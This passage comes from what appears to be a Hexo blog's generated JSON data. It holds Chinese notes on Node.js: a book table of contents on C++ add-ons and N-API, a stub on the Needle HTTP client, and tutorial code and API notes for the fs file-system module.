class=\"line\">7.4.2 JavaScript 代码的完善 398</span><br><span class=\"line\">7.4.3 小结 400</span><br><span class=\"line\"></span><br><span class=\"line\">8 实战——现有包剖析 401</span><br><span class=\"line\">8.1 字符串哈希模块——Bling Hashes 401</span><br><span class=\"line\">8.1.1 文件设定 402</span><br><span class=\"line\">8.1.2 C++ 源码剖析 403</span><br><span class=\"line\">8.1.3 JavaScript 源码剖析 408</span><br><span class=\"line\">8.1.4 小结 409</span><br><span class=\"line\">8.1.5 参考资料 410</span><br><span class=\"line\">8.2 类 Proxy 包——Auto Object 410</span><br><span class=\"line\">8.2.1 Proxy 410</span><br><span class=\"line\">8.2.2 Auto Object 使用范例 412</span><br><span class=\"line\">8.2.3 代码剖析 415</span><br><span class=\"line\">8.2.4 小结 424</span><br><span class=\"line\">8.2.5 参考资料 424</span><br><span class=\"line\"></span><br><span class=\"line\">9 N-API——下一代 Node.js C++ 扩展开发方式 425</span><br><span class=\"line\">9.1 浅尝辄止 426</span><br><span class=\"line\">9.1.1 实现一个 Echo 函数 426</span><br><span class=\"line\">9.1.2 尝试运行 N-API 扩展 430</span><br><span class=\"line\">9.1.3 向下兼容 431</span><br><span class=\"line\">9.1.4 N-API Package——C++ 封装 433</span><br><span class=\"line\">9.1.5 小结 433</span><br><span class=\"line\">9.1.6 参考资料 433</span><br><span class=\"line\">9.2 基本数据类型与错误处理 433</span><br><span class=\"line\">9.2.1 基本数据类型 433</span><br><span class=\"line\">9.2.2 与作用域及生命周期相关的数据类型 435</span><br><span class=\"line\">9.2.3 回调数据类型 438</span><br><span class=\"line\">9.2.4 错误处理 439</span><br><span class=\"line\">9.2.5 模块注册 441</span><br><span class=\"line\">9.2.6 小结 442</span><br><span class=\"line\">9.2.7 参考资料 442</span><br><span class=\"line\">9.3 对象与函数 442</span><br><span class=\"line\">9.3.1 对象 442</span><br><span class=\"line\">9.3.2 函数 448</span><br><span class=\"line\">9.3.3 类的封装 453</span><br><span class=\"line\">9.3.4 小结 455</span><br><span class=\"line\">9.3.5 参考资料 455</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://cnodejs.org/topic/5b223c1d5cd02be640901490\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n<hr>\n<p><a href=\"https://www.npmjs.com/package/node-gyp\" target=\"_blank\" rel=\"noopener\">GYP介绍: Node.js本机插件构建工具</a><br><a href=\"https://blog.csdn.net/p13503959390/article/details/72793448\" target=\"_blank\" rel=\"noopener\">使用技巧</a></p>\n"},{"title":"Node-HTTPClient","date":"2018-07-31T06:56:14.000Z","_content":"## Node-HTTPClient\nThe leanest and most handsome HTTP client in the Nodelands. —— [Needle](https://www.npmjs.com/package/needle)\n\n---\n笔记待整理","source":"_posts/programmingLanguage/NodeJS/Node-HTTPClient.md","raw":"---\ntitle: Node-HTTPClient\ndate: 2018-07-31 14:56:14\ntags: Node-HTTPClient\ncategories: HTTP\n---\n## Node-HTTPClient\nThe leanest and most handsome HTTP client in the Nodelands. —— [Needle](https://www.npmjs.com/package/needle)\n\n---\n笔记待整理","slug":"programmingLanguage/NodeJS/Node-HTTPClient","published":1,"updated":"2018-09-05T06:33:18.494Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry0m00b9zodvfzaxszde","content":"<h2 id=\"Node-HTTPClient\"><a href=\"#Node-HTTPClient\" class=\"headerlink\" title=\"Node-HTTPClient\"></a>Node-HTTPClient</h2><p>The leanest and most handsome HTTP client in the Nodelands. —— <a href=\"https://www.npmjs.com/package/needle\" target=\"_blank\" rel=\"noopener\">Needle</a></p>\n<hr>\n<p>笔记待整理</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Node-HTTPClient\"><a href=\"#Node-HTTPClient\" class=\"headerlink\" title=\"Node-HTTPClient\"></a>Node-HTTPClient</h2><p>The leanest and most handsome HTTP client in the Nodelands. —— <a href=\"https://www.npmjs.com/package/needle\" target=\"_blank\" rel=\"noopener\">Needle</a></p>\n<hr>\n<p>笔记待整理</p>\n"},{"title":"FS模块","date":"2018-07-05T06:47:46.000Z","_content":"## [Node.js fs模块(文件模块) 创建、删除目录(文件) 读取写入文件流](https://blog.csdn.net/houyanhua1/article/details/79443987)\n\n````\n/* \n 1. fs.stat  检测是文件还是目录(目录 文件是否存在) \n 2. fs.mkdir  创建目录 （创建之前先判断是否存在） \n 3. fs.writeFile  写入文件(文件不存在就创建,但不能创建目录) \n 4. fs.appendFile 写入追加文件 \n 5. fs.readFile 读取文件 \n 6. fs.readdir 读取目录 \n 7. fs.rename 重命名 \n 8. fs.rmdir  删除目录 \n 9. fs.unlink 删除文件 \n 10. fs.createReadStream('') 从文件流中读取数据\n 11. fs.createWriteStream  写入文件流\n 12. pipe 管道流 \n 13. fs.access 判断目录、文件是否存在(读写权限)\n*/\n \nvar fs=require('fs');   //fs是node.js的核心模块，不用下载安装，可以直接引入  \n \n//1. fs.stat  检测是文件还是目录  fs.statSync()同步获取stats对象,通过返回值接收。\nfs.stat('html',function(error,stats){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    console.log('文件：'+stats.isFile());\n    console.log('目录：'+stats.isDirectory());\n})\n \n \n//2. fs.mkdir  创建目录  \nfs.mkdir('css',function(error){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    console.log('创建目录成功');\n})\n \n \n//3. fs.writeFile  写入文件（会覆盖之前的内容）（文件不存在就创建）  utf8参数可以省略  \nfs.writeFile('123.txt','你好nodejs 覆盖','utf8',function(error){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    console.log('写入成功');\n})\n \n \n//4. fs.appendFile 追加文件  \nfs.appendFile('123.txt','这是写入的内容\\n',function(error){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    console.log('写入成功');\n})\n \n \n//5.fs.readFile 读取文件  \nfs.readFile('123.txt',function(error,data){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    //console.log(data);  //data是读取的十六进制的数据。  也可以在参数中加入编码格式\"utf8\"来解决十六进制的问题;\n    console.log(data.toString());  //读取出所有行的信息  \n})\n \n \n//6.fs.readdir 读取目录下第一级内容  把目录下面的文件和文件夹都获取到。  \nfs.readdir('html',function(error,data){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    console.log(data);  //data是数组类型，包含文件夹以及文件的名字(只有第一级目录内容)。拿到一个文件夹下面的所有目录  \n})\n \n \n//7.fs.rename 重命名  1.改名  2.剪切文件(移动)  \nfs.rename('html/index.html','html/news.html',function(error){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    console.log('修改名字成功');\n})\n \n \n//8. fs.rmdir  删除目录   rmdir 这个方法只能删除目录，不能删除文件  \nfs.rmdir('abc目录',function(error){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    console.log('删除目录成功');\n})\n \n \n//9. fs.unlink删除文件  \nfs.unlink('index.txt',function(error){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    console.log('删除文件成功');\n})\n \n \n//10. fs.createReadStream  从文件流中读取数据，读取的文件比较大时建议用流的方式读取，文件比较大会多次读取。  \nvar fileReadStream = fs.createReadStream( 'data1.json');\nvar str = '';\nfileReadStream.on('data', (data) => {\n    console.log(\"接收到\" + data.length);   //文件比较大时，会多次读取，多次执行该回调函数  \nstr += data;\n})\nfileReadStream.on('end', () => {\n    console.log(\" --- 结束 ---\");\nconsole.log( str );\n})\nfileReadStream.on('error', (error) => {\n    console.log(error)\n})\n \n \n//11. fs.createWriteStream  写入文件流  \nvar fs = require(\"fs\");\nvar data  = \"我是从数据库获取的数据，我要保存起来\";\nvar writerStream = fs.createWriteStream('output.txt');\nwriterStream.write( data , 'UTF8' );\nwriterStream.end();  //标记文件末尾  结束写入流，释放资源  \nwriterStream.on( 'finish',  function() {\n    console.log(\"写入完成。\");\n});\nwriterStream.on( 'error',  function(error){\n    console.log(error.stack);\n});\nconsole.log(\"程序执行完毕\");\n \n \n//12. pipe 管道流  \nvar fs = require(\"fs\");\nvar readerStream = fs.createReadStream( 'input.txt');\nvar writerStream = fs.createWriteStream( 'output.txt');\nreaderStream.pipe( writerStream );\nconsole.log(\"程序执行完毕\");\n \n \n//13. fs.access 判断目录、文件是否存在(读写权限)\nvar  fs = require('fs');\nfs.access('package.json',(err)=>{\n    console.log(err ?  '目录/文件不存在': '文件存在,可以进行读写');\n});\n \n\n````\n\n---\n\n## [FS-文件系统](http://nodejs.cn/api/fs.html#fs_file_system)\nfs 模块提供了一些 API，用于以一种类似标准 POSIX 函数的方式与文件系统进行交互。\n\n**所有的文件系统操作都有异步和同步两种形式。**\n\n`异步`形式的 **最后一个`参数`都是完成时`回调函数`**。 传给回调函数的参数取决于具体方法，但`回调函数的第一个参数都会保留给异常`。 如果操作成功完成，则第一个参数会是 null 或 undefined。\n\n**同步操作**\n\n当使用`同步操作`时，任何异常都会被立即抛出，可以使用 `try/catch` 来处理异常，或让异常向上冒泡。\n\n````\nconst fs = require('fs');\n\ntry {\n  fs.unlinkSync('/tmp/hello');\n  console.log('successfully deleted /tmp/hello');\n} catch (err) {\n  // handle the error\n}\n````\n**异步操作**\n\n注意，异步的方法不能保证执行顺序。 所以下面的例子可能会出错，因为 fs.stat() 操作可能在 fs.rename() 操作之前完成。\n\n**建议**\n\n在繁忙的进程中，建议使用函数的异步版本。 同步的方法会阻塞整个进程，直到完成（停止所有连接）。\n\n### 文件路径\n大部分 `fs` 操作接受`字符串`、`Buffer`、或使用 `file:` 协议的 `URL` 对象作为文件路径。\n\n`相对路径` 会相对于 `process.cwd()` 定义的当前工作目录进行处理。\n\n使用 `Buffer` 定义的路径主要用于将文件路径处理为 opaque 字节序列的特定 POSIX 操作系统。 在这种系统上，一个文件路径可能包含使用多种字符编码的子序列。 与字符串路径一样，Buffer 路径也可以是相对的或绝对的。\n\n**注意** 在 Windows 上 Node.js 遵循 per-drive 工作目录的理念。 当使用驱动器路径不带反斜杠时可以观察到该特性。 例如，fs.readdirSync('c:\\\\') 可能会返回与 fs.readdirSync('c:') 不同的结果。 详见 [MSDN路径文档]()\n\n#### 支持 URL 对象\n\n### **文件描述符**\n在 `POSIX` 系统，`内核`为`所有进程`维护着一张当前打开着的`文件与资源表格`。 每个打开的文件都会分配一个名为`文件描述符`的数值标识。\n\n在`系统层`，所有`文件系统操作`使用这些`文件描述符`来识别与追踪每个特定的文件。 \n\nWindow 系统使用了一个`不同但概念类似`的机制来追踪资源。 \n\n为方便用户，`Node.js 抽象了不同操作系统间的差异`，为所有打开的文件分配了数值的文件描述符。\n\n`fs.open()` 方法用于分配一个新的文件描述符。 一旦分配了，文件描述符可用于`读取`数据、`写入`数据、或`查看`文件信息。\n\n`大多数操作系统`会`限制打开的文件描述符的数量`，所以当`操作完成时需关闭描述符`。 如果不这样做会导致`内存泄漏`，最终造成应用奔溃。\n\n### 线程池的使用\n注意，所有文件系统 API 中，除了 `fs.FSWatcher()` 和那些显式同步的方法之外，都使用了 `libuv` 的线程池，这对于某些应用程序可能会产生出乎意料问题和负面的性能影响，详见 [`UV_THREADPOOL_SIZE`](http://nodejs.cn/api/cli.html#cli_uv_threadpool_size_size) 文档。\n\n# fs.FSWatcher 类\n成功调用 `fs.watch()` 方法会返回一个新的 `fs.FSWatcher` 对象。\n\n所有 `fs.FSWatcher` 对象都是 [`EventEmitter`](http://nodejs.cn/api/events.html) 的，每当监视的文件被修改时会触发 `'change'` 事件。\n\n## 'change' 事件\n+ `eventType` \\<string> 发生的变化事件的类型。\n+ `filename` \\<string> | \\<Buffer> 变化的文件名（如果是相关的或有效的）。\n\n当被监视的目录或文件有变化时触发。 详见 `fs.watch()`\n\n## 'close' 事件\n当 `watcher` 停止监视文件变化时触发。 关闭的 `fs.FSWatcher` 对象在事件处理函数中不再可用。\n\n## 'error' 事件\n当监视文件发生错误时触发。 \n\n发生错误的 `fs.FSWatcher` 对象在事件处理函数中`不再可用`。\n\n## watcher.close()\n`fs.FSWatcher` `停止监视`文件的变化。 \n\n一旦停止，`fs.FSWatcher` 对象将`不再可用`。\n\n# fs.ReadStream 类\n成功调用 `fs.createReadStream()` 会返回一个新的 `fs.ReadStream` 对象。\n\n`fs.ReadStream` 对象都是可读流。\n\n## 'close' 事件\n当 `fs.ReadStream` 底层的文件描述符被关闭时触发。\n\n## 'open' 事件\n\n## 'ready' 事件\n\n## readStream.bytesRead\n已读取的字节数。\n\n## readStream.path\n\n# fs.Stats 类\n`fs.Stats` 对象提供了一个文件的信息。\n\n## stats.isBlockDevice()\n如果 `fs.Stats` 对象表示一个块设备，则返回 true 。\n\n## stats.isCharacterDevice()\n如果 `fs.Stats` 对象表示一个字符设备，则返回 true 。\n\n## stats.isDirectory()\n如果 `fs.Stats` 对象表示一个文件系统目录，则返回 true 。\n\n## stats.isFIFO()\n如果 `fs.Stats` 对象表示一个`先进先出 (FIFO) 管道`，则返回 true 。\n\nFIFO( First Input First Output)简单说就是指先进先出。[百度百科: FIFO存储器](https://baike.baidu.com/item/FIFO存储器/4530258?fr=aladdin)\n\n## stats.isFile()\n如果 `fs.Stats` 对象表示一个普通文件，则返回 `true` 。\n\n## stats.isSocket()\n如果 `fs.Stats` 对象表示一个 `socket`，则返回 `true` 。\n\n## stats.isSymbolicLink()\n如果 `fs.Stats` 对象表示一个符号链接，则返回 `true` 。\n\n该方法只在使用 `fs.lstat()` 时有效。\n\n## stats属性\n\n| type | description |\n| :--: |   :-----   |\n| stats.dev | 包含文件的设备的数值型标识。 |\n| stats.ino | 文件系统特定的文件索引节点数值。 |\n| stats.mode | 表示文件类型与模式的位域。 |\n| stats.nlink | 文件的硬链接数量。 |\n| stats.uid | 文件拥有者的数值型用户标识。 |\n| stats.gid | 拥有文件的群组的数值型群组标识。 |\n| stats.rdev | 如果文件是一个特殊文件，则返回数值型的设备标识。 |\n| stats.size | 文件的字节大小。 |\n| stats.blksize | 文件系统用于 I/O 操作的块大小。 |\n| stats.blocks | 分配给文件的块的数量。 |\n| stats.atimeMs | 表示文件最后一次被`访问`的时间戳。 |\n| stats.mtimeMs | 表示文件最后一次被`修改`的时间戳。 |\n| stats.ctimeMs | 表示文件`状态最后一次被改变`的时间戳。 |\n| stats.birthtimeMs | 表示文件的`创建时间戳`。 |\n| stats.atime | 表示文件`最后一次被访问`的时间。 |\n| stats.mtime | 表示文件`最后一次被修改`的时间。 |\n| stats.ctime | 表示文件`状态最后一次被改变`的时间。 |\n| stats.birthtime | 表示文件的`创建`时间。 |\n|  |  |\n\n## Stat 时间的值\n略\n\n# fs.WriteStream 类\n\n","source":"_posts/programmingLanguage/NodeJS/Node-js-FS模块.md","raw":"---\ntitle: FS模块\ndate: 2018-07-05 14:47:46\ntags: FileSystem\ncategories: Node FS\n---\n## [Node.js fs模块(文件模块) 创建、删除目录(文件) 读取写入文件流](https://blog.csdn.net/houyanhua1/article/details/79443987)\n\n````\n/* \n 1. fs.stat  检测是文件还是目录(目录 文件是否存在) \n 2. fs.mkdir  创建目录 （创建之前先判断是否存在） \n 3. fs.writeFile  写入文件(文件不存在就创建,但不能创建目录) \n 4. fs.appendFile 写入追加文件 \n 5. fs.readFile 读取文件 \n 6. fs.readdir 读取目录 \n 7. fs.rename 重命名 \n 8. fs.rmdir  删除目录 \n 9. fs.unlink 删除文件 \n 10. fs.createReadStream('') 从文件流中读取数据\n 11. fs.createWriteStream  写入文件流\n 12. pipe 管道流 \n 13. fs.access 判断目录、文件是否存在(读写权限)\n*/\n \nvar fs=require('fs');   //fs是node.js的核心模块，不用下载安装，可以直接引入  \n \n//1. fs.stat  检测是文件还是目录  fs.statSync()同步获取stats对象,通过返回值接收。\nfs.stat('html',function(error,stats){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    console.log('文件：'+stats.isFile());\n    console.log('目录：'+stats.isDirectory());\n})\n \n \n//2. fs.mkdir  创建目录  \nfs.mkdir('css',function(error){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    console.log('创建目录成功');\n})\n \n \n//3. fs.writeFile  写入文件（会覆盖之前的内容）（文件不存在就创建）  utf8参数可以省略  \nfs.writeFile('123.txt','你好nodejs 覆盖','utf8',function(error){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    console.log('写入成功');\n})\n \n \n//4. fs.appendFile 追加文件  \nfs.appendFile('123.txt','这是写入的内容\\n',function(error){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    console.log('写入成功');\n})\n \n \n//5.fs.readFile 读取文件  \nfs.readFile('123.txt',function(error,data){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    //console.log(data);  //data是读取的十六进制的数据。  也可以在参数中加入编码格式\"utf8\"来解决十六进制的问题;\n    console.log(data.toString());  //读取出所有行的信息  \n})\n \n \n//6.fs.readdir 读取目录下第一级内容  把目录下面的文件和文件夹都获取到。  \nfs.readdir('html',function(error,data){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    console.log(data);  //data是数组类型，包含文件夹以及文件的名字(只有第一级目录内容)。拿到一个文件夹下面的所有目录  \n})\n \n \n//7.fs.rename 重命名  1.改名  2.剪切文件(移动)  \nfs.rename('html/index.html','html/news.html',function(error){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    console.log('修改名字成功');\n})\n \n \n//8. fs.rmdir  删除目录   rmdir 这个方法只能删除目录，不能删除文件  \nfs.rmdir('abc目录',function(error){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    console.log('删除目录成功');\n})\n \n \n//9. fs.unlink删除文件  \nfs.unlink('index.txt',function(error){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    console.log('删除文件成功');\n})\n \n \n//10. fs.createReadStream  从文件流中读取数据，读取的文件比较大时建议用流的方式读取，文件比较大会多次读取。  \nvar fileReadStream = fs.createReadStream( 'data1.json');\nvar str = '';\nfileReadStream.on('data', (data) => {\n    console.log(\"接收到\" + data.length);   //文件比较大时，会多次读取，多次执行该回调函数  \nstr += data;\n})\nfileReadStream.on('end', () => {\n    console.log(\" --- 结束 ---\");\nconsole.log( str );\n})\nfileReadStream.on('error', (error) => {\n    console.log(error)\n})\n \n \n//11. fs.createWriteStream  写入文件流  \nvar fs = require(\"fs\");\nvar data  = \"我是从数据库获取的数据，我要保存起来\";\nvar writerStream = fs.createWriteStream('output.txt');\nwriterStream.write( data , 'UTF8' );\nwriterStream.end();  //标记文件末尾  结束写入流，释放资源  \nwriterStream.on( 'finish',  function() {\n    console.log(\"写入完成。\");\n});\nwriterStream.on( 'error',  function(error){\n    console.log(error.stack);\n});\nconsole.log(\"程序执行完毕\");\n \n \n//12. pipe 管道流  \nvar fs = require(\"fs\");\nvar readerStream = fs.createReadStream( 'input.txt');\nvar writerStream = fs.createWriteStream( 'output.txt');\nreaderStream.pipe( writerStream );\nconsole.log(\"程序执行完毕\");\n \n \n//13. fs.access 判断目录、文件是否存在(读写权限)\nvar  fs = require('fs');\nfs.access('package.json',(err)=>{\n    console.log(err ?  '目录/文件不存在': '文件存在,可以进行读写');\n});\n \n\n````\n\n---\n\n## [FS-文件系统](http://nodejs.cn/api/fs.html#fs_file_system)\nfs 模块提供了一些 API，用于以一种类似标准 POSIX 函数的方式与文件系统进行交互。\n\n**所有的文件系统操作都有异步和同步两种形式。**\n\n`异步`形式的 **最后一个`参数`都是完成时`回调函数`**。 传给回调函数的参数取决于具体方法，但`回调函数的第一个参数都会保留给异常`。 如果操作成功完成，则第一个参数会是 null 或 undefined。\n\n**同步操作**\n\n当使用`同步操作`时，任何异常都会被立即抛出，可以使用 `try/catch` 来处理异常，或让异常向上冒泡。\n\n````\nconst fs = require('fs');\n\ntry {\n  fs.unlinkSync('/tmp/hello');\n  console.log('successfully deleted /tmp/hello');\n} catch (err) {\n  // handle the error\n}\n````\n**异步操作**\n\n注意，异步的方法不能保证执行顺序。 所以下面的例子可能会出错，因为 fs.stat() 操作可能在 fs.rename() 操作之前完成。\n\n**建议**\n\n在繁忙的进程中，建议使用函数的异步版本。 同步的方法会阻塞整个进程，直到完成（停止所有连接）。\n\n### 文件路径\n大部分 `fs` 操作接受`字符串`、`Buffer`、或使用 `file:` 协议的 `URL` 对象作为文件路径。\n\n`相对路径` 会相对于 `process.cwd()` 定义的当前工作目录进行处理。\n\n使用 `Buffer` 定义的路径主要用于将文件路径处理为 opaque 字节序列的特定 POSIX 操作系统。 在这种系统上，一个文件路径可能包含使用多种字符编码的子序列。 与字符串路径一样，Buffer 路径也可以是相对的或绝对的。\n\n**注意** 在 Windows 上 Node.js 遵循 per-drive 工作目录的理念。 当使用驱动器路径不带反斜杠时可以观察到该特性。 例如，fs.readdirSync('c:\\\\') 可能会返回与 fs.readdirSync('c:') 不同的结果。 详见 [MSDN路径文档]()\n\n#### 支持 URL 对象\n\n### **文件描述符**\n在 `POSIX` 系统，`内核`为`所有进程`维护着一张当前打开着的`文件与资源表格`。 每个打开的文件都会分配一个名为`文件描述符`的数值标识。\n\n在`系统层`，所有`文件系统操作`使用这些`文件描述符`来识别与追踪每个特定的文件。 \n\nWindow 系统使用了一个`不同但概念类似`的机制来追踪资源。 \n\n为方便用户，`Node.js 抽象了不同操作系统间的差异`，为所有打开的文件分配了数值的文件描述符。\n\n`fs.open()` 方法用于分配一个新的文件描述符。 一旦分配了，文件描述符可用于`读取`数据、`写入`数据、或`查看`文件信息。\n\n`大多数操作系统`会`限制打开的文件描述符的数量`，所以当`操作完成时需关闭描述符`。 如果不这样做会导致`内存泄漏`，最终造成应用奔溃。\n\n### 线程池的使用\n注意，所有文件系统 API 中，除了 `fs.FSWatcher()` 和那些显式同步的方法之外，都使用了 `libuv` 的线程池，这对于某些应用程序可能会产生出乎意料问题和负面的性能影响，详见 [`UV_THREADPOOL_SIZE`](http://nodejs.cn/api/cli.html#cli_uv_threadpool_size_size) 文档。\n\n# fs.FSWatcher 类\n成功调用 `fs.watch()` 方法会返回一个新的 `fs.FSWatcher` 对象。\n\n所有 `fs.FSWatcher` 对象都是 [`EventEmitter`](http://nodejs.cn/api/events.html) 的，每当监视的文件被修改时会触发 `'change'` 事件。\n\n## 'change' 事件\n+ `eventType` \\<string> 发生的变化事件的类型。\n+ `filename` \\<string> | \\<Buffer> 变化的文件名（如果是相关的或有效的）。\n\n当被监视的目录或文件有变化时触发。 详见 `fs.watch()`\n\n## 'close' 事件\n当 `watcher` 停止监视文件变化时触发。 关闭的 `fs.FSWatcher` 对象在事件处理函数中不再可用。\n\n## 'error' 事件\n当监视文件发生错误时触发。 \n\n发生错误的 `fs.FSWatcher` 对象在事件处理函数中`不再可用`。\n\n## watcher.close()\n`fs.FSWatcher` `停止监视`文件的变化。 \n\n一旦停止，`fs.FSWatcher` 对象将`不再可用`。\n\n# fs.ReadStream 类\n成功调用 `fs.createReadStream()` 会返回一个新的 `fs.ReadStream` 对象。\n\n`fs.ReadStream` 对象都是可读流。\n\n## 'close' 事件\n当 `fs.ReadStream` 底层的文件描述符被关闭时触发。\n\n## 'open' 事件\n\n## 'ready' 事件\n\n## readStream.bytesRead\n已读取的字节数。\n\n## readStream.path\n\n# fs.Stats 类\n`fs.Stats` 对象提供了一个文件的信息。\n\n## stats.isBlockDevice()\n如果 `fs.Stats` 对象表示一个块设备，则返回 true 。\n\n## stats.isCharacterDevice()\n如果 `fs.Stats` 对象表示一个字符设备，则返回 true 。\n\n## stats.isDirectory()\n如果 `fs.Stats` 对象表示一个文件系统目录，则返回 true 。\n\n## stats.isFIFO()\n如果 `fs.Stats` 对象表示一个`先进先出 (FIFO) 管道`，则返回 true 。\n\nFIFO( First Input First Output)简单说就是指先进先出。[百度百科: FIFO存储器](https://baike.baidu.com/item/FIFO存储器/4530258?fr=aladdin)\n\n## stats.isFile()\n如果 `fs.Stats` 对象表示一个普通文件，则返回 `true` 。\n\n## stats.isSocket()\n如果 `fs.Stats` 对象表示一个 `socket`，则返回 `true` 。\n\n## stats.isSymbolicLink()\n如果 `fs.Stats` 对象表示一个符号链接，则返回 `true` 。\n\n该方法只在使用 `fs.lstat()` 时有效。\n\n## stats属性\n\n| type | description |\n| :--: |   :-----   |\n| stats.dev | 包含文件的设备的数值型标识。 |\n| stats.ino | 文件系统特定的文件索引节点数值。 |\n| stats.mode | 表示文件类型与模式的位域。 |\n| stats.nlink | 文件的硬链接数量。 |\n| stats.uid | 文件拥有者的数值型用户标识。 |\n| stats.gid | 拥有文件的群组的数值型群组标识。 |\n| stats.rdev | 如果文件是一个特殊文件，则返回数值型的设备标识。 |\n| stats.size | 文件的字节大小。 |\n| stats.blksize | 文件系统用于 I/O 操作的块大小。 |\n| stats.blocks | 分配给文件的块的数量。 |\n| stats.atimeMs | 表示文件最后一次被`访问`的时间戳。 |\n| stats.mtimeMs | 表示文件最后一次被`修改`的时间戳。 |\n| stats.ctimeMs | 表示文件`状态最后一次被改变`的时间戳。 |\n| stats.birthtimeMs | 表示文件的`创建时间戳`。 |\n| stats.atime | 表示文件`最后一次被访问`的时间。 |\n| stats.mtime | 表示文件`最后一次被修改`的时间。 |\n| stats.ctime | 表示文件`状态最后一次被改变`的时间。 |\n| stats.birthtime | 表示文件的`创建`时间。 |\n|  |  |\n\n## Stat 时间的值\n略\n\n# fs.WriteStream 类\n\n","slug":"programmingLanguage/NodeJS/Node-js-FS模块","published":1,"updated":"2018-09-05T06:33:18.495Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry0o00bczodv4wes37qm","content":"<h2 id=\"Node-js-fs模块-文件模块-创建、删除目录-文件-读取写入文件流\"><a href=\"#Node-js-fs模块-文件模块-创建、删除目录-文件-读取写入文件流\" class=\"headerlink\" title=\"Node.js fs模块(文件模块) 创建、删除目录(文件) 读取写入文件流\"></a><a href=\"https://blog.csdn.net/houyanhua1/article/details/79443987\" target=\"_blank\" rel=\"noopener\">Node.js fs模块(文件模块) 创建、删除目录(文件) 读取写入文件流</a></h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span 